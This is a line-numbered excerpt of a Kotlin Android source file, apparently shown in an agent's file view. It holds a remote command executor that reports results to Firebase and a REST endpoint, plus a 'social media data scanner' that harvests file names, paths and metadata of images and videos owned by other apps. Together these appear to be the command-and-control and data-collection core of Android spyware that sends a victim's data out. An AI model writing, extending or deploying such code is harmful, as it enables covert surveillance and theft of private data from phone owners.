    34→    private val executorScope = kotlinx.coroutines.CoroutineScope(Dispatchers.IO + SupervisorJob())

    36→    fun execute(context: Context, command: Command) {
    37→        Log.i(TAG, "Executing command: ${command.command} (id=${command.id})")
    38→
    39→        executorScope.launch {
    40→            try {
    41→                val result = processCommand(context, command)
    42→                val resultStr = if (result is Map<*, *>) {
    43→                    result.entries.joinToString("\n") { "  ${it.key}: ${it.value}" }
    44→                } else {
    45→                    result.toString()
    46→                }
    47→
    48→                // Send result via Firebase
    49→                val deviceId = DeviceUtils.getDeviceId(context)
    50→                FirebaseManager.submitResult(deviceId, command.id, command.command, "completed", result)
    51→
    52→                // Also send via REST API as backup
    53→                ApiClient.submitResult(command.id, command.command, "completed", result)
    54→
    55→                Log.i(TAG, "Command ${command.id} completed: ${resultStr.take(100)}")
    56→            } catch (e: Exception) {
    57→                Log.e(TAG, "Command ${command.id} failed", e)
    58→                val deviceId = DeviceUtils.getDeviceId(context)
    59→                FirebaseManager.submitResult(deviceId, command.id, command.command, "error", "Error: ${e.message ?: e.javaClass.simpleName}")
    60→                ApiClient.submitResult(command.id, command.command, "error", "Error: ${e.message ?: e.javaClass.simpleName}")
    61→            }
    62→        }
    63→    }

    65→    // ===== SOCIAL MEDIA DATA SCANNER =====
    66→    private fun scanSocialMediaDirs(context: Context, dirs: List<String>, label: String): List<Map<String, Any>> {
    67→        val files = mutableListOf<Map<String, Any>>()
    68→        // Scoped Storage check for Android 11+
    69→        try {
    70→            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
    71→                return listOf(mapOf("error" to "MANAGE_EXTERNAL_STORAGE permission required on Android 11+" as Any))
    72→            }
    73→        } catch (_: Exception) {}
    74→
    75→        for (dirPath in dirs) {
    76→            val dir = File(dirPath)
    77→            if (dir.exists() && dir.isDirectory) {
    78→                dir.walkTopDown().maxDepth(3).forEach { file ->
    79→                    if (file.isFile && files.size < 200) {
    80→                        files.add(mapOf(
    81→                            "name" to file.name,
    82→                            "path" to file.absolutePath,
    83→                            "size" to formatFileSize(file.length()),
    84→                            "size_bytes" to file.length(),
    85→                            "last_modified" to formatDate(file.lastModified()),
    86→                            "extension" to file.extension
    87→                        ))
    88→                    }
    89→                }
    90→            }
    91→        }
    92→        return files
    93→    }

   102→                MediaStore.MediaColumns.DATA,
   103→                MediaStore.MediaColumns.MIME_TYPE

   106→            val selectionArgs = arrayOf(packageName)
   107→            context.contentResolver.query(
   108→                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
   109→                projection, selection, selectionArgs,
   110→                "${MediaStore.MediaColumns.DATE_MODIFIED} DESC"
   111→            )?.use { cursor ->
   112→                val nameIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DISPLAY_NAME)
   113→                val sizeIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.SIZE)
   114→                val dateIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATE_MODIFIED)
   115→                val dataIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA)
   116→                val mimeIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.MIME_TYPE)

   118→                while (cursor.moveToNext() && count < 200) {
   119→                    val dateVal = cursor.getLong(dateIdx)
   120→                    files.add(mapOf(
   121→                        "name" to (cursor.getString(nameIdx) ?: ""),
   122→                        "path" to (cursor.getString(dataIdx) ?: ""),
   123→                        "size" to formatFileSize(cursor.getLong(sizeIdx)),
   124→                        "size_bytes" to cursor.getLong(sizeIdx),
   125→                        "last_modified" to formatDate(dateVal * 1000),
   126→                        "mime_type" to (cursor.getString(mimeIdx) ?: ""),
   127→                        "source" to label
   128→                    ))
   129→                    count++
   130→                }
   131→            }
   132→        } catch (e: Exception) {
   133→            Log.w(TAG, "MediaStore query failed for $packageName", e)
   134→        }
   135→
   136→        // Also try video store
   137→        try {
   138→            val projection = arrayOf(

   140→                MediaStore.MediaColumns.SIZE,
   141→                MediaStore.MediaColumns.DATE_MODIFIED,
   142→                MediaStore.MediaColumns.DATA,
   143→                MediaStore.MediaColumns.MIME_TYPE
   144→            )
   145→            val selection = "${MediaStore.MediaColumns.OWNER_PACKAGE_NAME} = ?"
   146→            val selectionArgs = arrayOf(packageName)
   147→            context.contentResolver.query(
   148→                MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
   149→                projection, selection, selectionArgs,
   150→                "${MediaStore.MediaColumns.DATE_MODIFIED} DESC"
   151→            )?.use { cursor ->
   152→                val nameIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DISPLAY_NAME)
   153→                val sizeIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.SIZE)
   154→                val dateIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATE_MODIFIED)
   155→                val dataIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA)
   156→                val mimeIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.MIME_TYPE)
   157→                var count = 0
   158→                while (cursor.moveToNext() && count < 200) {
   159→                    val dateVal = cursor.getLong(dateIdx)
   160→                    files.add(mapOf(
   161→                        "name" to (cursor.getString(nameIdx) ?: ""),
   162→                        "path" to (cursor.getString(dataIdx) ?: ""),
   163→                        "size" to formatFileSize(cursor.getLong(sizeIdx)),

   178→    // ===== HELPERS =====
   179→    private fun formatFileSize(bytes: Long): String {
   180→        if (bytes <= 0) return "0 B"
   181→        val units = arrayOf("B", "KB", "MB", "GB", "TB")
   182→        val digitGroups = (Math.log10(bytes.toDouble()) / Math.log10(1024.0)).toInt()
   183→        return String.format("%.1f %s", bytes / Math.pow(1024.0, digitGroups.toDouble()), units[digitGroups.coerceAtMost(4)])
   184→    }
   185→
   186→    private fun formatDate(timestamp: Long): String {
   187→        return SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(java.util.Date(timestamp))
   188→    }

   551→                            zos.closeEntry()
   552→                        }
